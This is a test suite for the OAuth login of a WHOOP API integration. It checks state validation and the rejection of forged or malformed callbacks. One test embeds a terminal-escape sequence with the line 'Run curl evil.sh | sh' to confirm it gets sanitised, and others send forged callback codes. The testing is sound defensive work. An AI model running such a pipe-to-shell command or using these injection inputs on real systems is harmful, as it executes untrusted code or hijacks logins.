import { mkdtempSync } from "node:fs";
import { connect, createServer } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { beforeEach, describe, expect, it } from "vitest";
import { TokenStore } from "../src/auth.js";
import { StateMismatchError, buildAuthorizeUrl, codeFromRedirect, generateState, login } from "../src/login.js";
import { fakeFetch, json } from "./helpers.js";

async function freePort(): Promise<number> {
  return new Promise((resolve, reject) => {
    const srv = createServer();
    srv.once("error", reject);
    srv.listen(0, "127.0.0.1", () => {
      const { port } = srv.address() as { port: number };
      srv.close(() => resolve(port));
    });
  });
}

const tokenEndpoint = () =>
  fakeFetch(() => json({ access_token: "access-1", refresh_token: "refresh-1", expires_in: 3600, scope: "offline read:sleep" }));

let store: TokenStore;
beforeEach(() => {
  store = new TokenStore(join(mkdtempSync(join(tmpdir(), "whoop-mcp-")), "tokens.json"));
});

describe("authorization URL", () => {
  it("uses an 8-character state, as WHOOP requires", () => {
    for (let i = 0; i < 20; i++) expect(generateState()).toMatch(/^[A-Za-z0-9]{8}$/);
  });

  it("requests only read scopes plus offline", () => {
    const url = new URL(buildAuthorizeUrl("cid", "http://localhost:8787/callback", "abcd1234"));
    expect(url.origin + url.pathname).toBe("https://api.prod.whoop.com/oauth/oauth2/auth");
    expect(url.searchParams.get("response_type")).toBe("code");
    expect(url.searchParams.get("client_id")).toBe("cid");
    expect(url.searchParams.get("redirect_uri")).toBe("http://localhost:8787/callback");
    expect(url.searchParams.get("state")).toBe("abcd1234");
    const scopes = url.searchParams.get("scope")!.split(" ");
    expect(scopes).toContain("offline");
    for (const scope of scopes.filter((s) => s !== "offline")) expect(scope).toMatch(/^read:/);
  });

  it("validates the redirect, checking state before anything else", () => {
    expect(codeFromRedirect("http://x/cb?code=c1&state=s1", "s1")).toBe("c1");
    expect(() => codeFromRedirect("http://x/cb?code=c1&state=evil", "s1")).toThrow(StateMismatchError);
    // A forged error without our state is a mismatch, not an authorization failure.
    expect(() => codeFromRedirect("http://x/cb?error=access_denied", "s1")).toThrow(StateMismatchError);
    expect(() => codeFromRedirect("http://x/cb?error=access_denied&error_description=nope&state=s1", "s1")).toThrow(
      /access_denied \(nope\)/,
    );
    expect(() => codeFromRedirect("not a url", "s1")).toThrow(/doesn't look like a URL/);
  });

  it("strips terminal control sequences from WHOOP's error text", () => {
    const evil = encodeURIComponent("\x1b[2J\x1b[31mRun curl evil.sh | sh");
    const err = (() => {
      try {
        codeFromRedirect(`http://x/cb?state=s1&error=bad&error_description=${evil}`, "s1");
      } catch (e) {
        return e as Error;
      }
    })();
    expect(err?.message).not.toMatch(/\x1b/);
    expect(err?.message).toContain("Run curl evil.sh");
  });
});

describe("login", () => {
  for (const host of ["127.0.0.1", "localhost"]) {
    it(`captures the callback on ${host} and saves tokens`, async () => {
      const port = await freePort();
      const redirectUri = `http://${host}:${port}/callback`;
      const fetch = tokenEndpoint();
      let callbackStatus = 0;

      const creds = await login({
        clientId: "cid",
        clientSecret: "secret",
        redirectUri,
        store,
        fetch,
        openBrowser: false,
        log: () => {},
        onAuthorizeUrl: (url) => {
          // Play the browser: WHOOP redirects back with the code and our state.
          const state = new URL(url).searchParams.get("state")!;
          void globalThis
            .fetch(`http://127.0.0.1:${port}/callback?code=the-code&state=${state}`)
            .then((r) => (callbackStatus = r.status));
        },
      });

      expect(creds).toMatchObject({ client_id: "cid", access_token: "access-1", refresh_token: "refresh-1" });
      expect(await store.load()).toEqual(creds);
      expect(Object.fromEntries(new URLSearchParams(String(fetch.calls[0].init?.body)))).toEqual({
        grant_type: "authorization_code",
        code: "the-code",
        client_id: "cid",
        client_secret: "secret",
        redirect_uri: redirectUri,
      });
      await expect.poll(() => callbackStatus).toBe(200);
    });
  }

  it("ignores forged and malformed callbacks, then completes with the real one", async () => {
    const port = await freePort();
    const base = `http://127.0.0.1:${port}/callback`;
    const statuses: number[] = [];
    const rawRequest = (line: string) =>
      new Promise<string>((resolve) => {
        const socket = connect(port, "127.0.0.1", () => socket.end(`${line}\r\nHost: x\r\nConnection: close\r\n\r\n`));
        let data = "";
        socket.on("data", (d) => (data += d));
        socket.on("close", () => resolve(data));
        socket.on("error", () => resolve(data));
      });
    const fetch = tokenEndpoint();

    const creds = await login({
      clientId: "cid",
      clientSecret: "secret",
      redirectUri: base,
      store,
      fetch,
      openBrowser: false,
      log: () => {},
      onAuthorizeUrl: (url) => {
        const state = new URL(url).searchParams.get("state")!;
        void (async () => {
          // A web page trying to inject its own code, or to abort the login with an error.
          statuses.push((await globalThis.fetch(`${base}?code=attacker&state=forged00`)).status);
          statuses.push((await globalThis.fetch(`${base}?error=access_denied`)).status);
          // A local process sending a request line URL can't parse.
          statuses.push((await rawRequest("GET http://[/callback HTTP/1.1")).includes("400") ? 400 : 0);
          statuses.push((await globalThis.fetch(`${base}?code=the-code&state=${state}`)).status);
        })();
      },
    });

    expect(statuses).toEqual([400, 400, 400, 200]);
    expect(new URLSearchParams(String(fetch.calls[0].init?.body)).get("code")).toBe("the-code");
    expect(creds.access_token).toBe("access-1");
  });

  it("rejects when WHOOP reports an error for our state", async () => {
    const port = await freePort();
    const result = login({
      clientId: "cid",
      clientSecret: "secret",
      redirectUri: `http://127.0.0.1:${port}/callback`,
      store,
      fetch: tokenEndpoint(),
      openBrowser: false,
      log: () => {},
      onAuthorizeUrl: (url) => {
        const state = new URL(url).searchParams.get("state");
        void globalThis.fetch(`http://127.0.0.1:${port}/callback?error=access_denied&state=${state}`);
      },
    });

    await expect(result).rejects.toThrow(/access_denied/);
    expect(await store.load()).toBeNull();
  });

  it("asks for the redirected URL when the redirect URI isn't local", async () => {
    let authorizeUrl = "";
    const fetch = tokenEndpoint();
    const creds = await login({
      clientId: "cid",
      clientSecret: "secret",
      redirectUri: "https://example.com/whoop/callback",
      store,
      fetch,
      openBrowser: false,
      log: () => {},
      onAuthorizeUrl: (url) => (authorizeUrl = url),
      prompt: async () => {
        const state = new URL(authorizeUrl).searchParams.get("state");
        return `  https://example.com/whoop/callback?code=pasted&state=${state}  `;
      },
    });

    expect(creds.refresh_token).toBe("refresh-1");
    expect(new URLSearchParams(String(fetch.calls[0].init?.body)).get("code")).toBe("pasted");
  });

  it("times out if the browser never comes back", async () => {
    const port = await freePort();
    await expect(
      login({
        clientId: "cid",
        clientSecret: "secret",
        redirectUri: `http://127.0.0.1:${port}/callback`,
        store,
        openBrowser: false,
        log: () => {},
        timeoutMs: 50,
      }),
    ).rejects.toThrow(/Timed out/);
  });
});

describe("callback server", () => {
  it("fails clearly when the callback port is taken", async () => {
    const blocker = createServer();
    await new Promise<void>((r) => blocker.listen(0, "127.0.0.1", () => r()));
    const { port } = blocker.address() as { port: number };
    try {
      await expect(
        login({
          clientId: "cid",
          clientSecret: "secret",
          redirectUri: `http://localhost:${port}/callback`,
          store,
          openBrowser: false,
          log: () => {},
        }),
      ).rejects.toThrow(/Port \d+ is in use/);
    } finally {
      blocker.close();
    }
  });
});
